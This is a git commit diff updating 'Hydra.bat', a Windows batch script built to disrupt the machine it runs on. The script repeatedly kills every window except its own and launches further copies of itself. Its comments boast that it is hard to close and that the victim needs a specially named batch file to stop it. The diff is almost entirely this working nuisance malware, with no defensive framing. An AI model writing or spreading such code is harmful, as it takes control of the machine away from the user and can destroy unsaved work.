771aecee498a1f73e537ff87c4c2c42f5dfc7dfb
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 11:46:53 -0500

    Update Hydra.bat

--- Hydra.bat
+++ Hydra.bat
@@ -1,12 +1,12 @@
+::The "Hydra" part isn't working yet. But it will.
 @ECHO OFF
 :loop
 SET n=1
 title Hydra.bat
-::Lets make this uncloseable by all other programs. 
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
 SET windowcount=%%F
 )
-TASKKILL /FI "WINDOWTITLE ne Hydra" ::Closes everything except for itself. They have to have a batch file already on their desktop to stop this one.
+TASKKILL /FI "WINDOWTITLE ne Hydra" ::Closes everything except for itself. They have to have a batch file already on their desktop titled Hydra to stop this one.
 IF "%windowcount%"=="%n%" (
 START Hydra.bat
 START Hydra.bat
